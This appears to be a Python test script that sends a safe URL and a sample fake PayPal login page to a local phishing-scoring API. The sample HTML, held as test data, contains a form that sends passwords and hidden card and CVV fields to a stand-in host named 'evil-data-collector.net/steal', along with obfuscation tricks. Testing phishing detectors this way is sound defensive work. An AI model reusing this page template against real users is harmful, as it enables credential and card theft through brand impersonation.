import requests
import json

api = "http://localhost:8000/api/v1/score"

# 1. Safe URL
requests.post(api, json={"url": "https://google.com"})

# 2. Phishing URL
phish_html = """
<html>
<head>
  <title>PayPal - Secure Login</title>
  <link rel="icon" href="https://paypal.com/favicon.ico">
</head>
<body oncontextmenu="return false;">
  <form action="http://evil-data-collector.net/steal">
    <input type="password" name="pass">
    <input type="hidden" name="cc">
    <input type="hidden" name="cvv">
  </form>
  <script>eval(atob("ZG9jdW1lbnQ="))</script>
</body>
</html>
"""
res = requests.post(api, json={"url": "http://fake-paypal-login2024.com/update", "html_content": phish_html})
print("Phishing Response:", json.dumps(res.json(), indent=2))
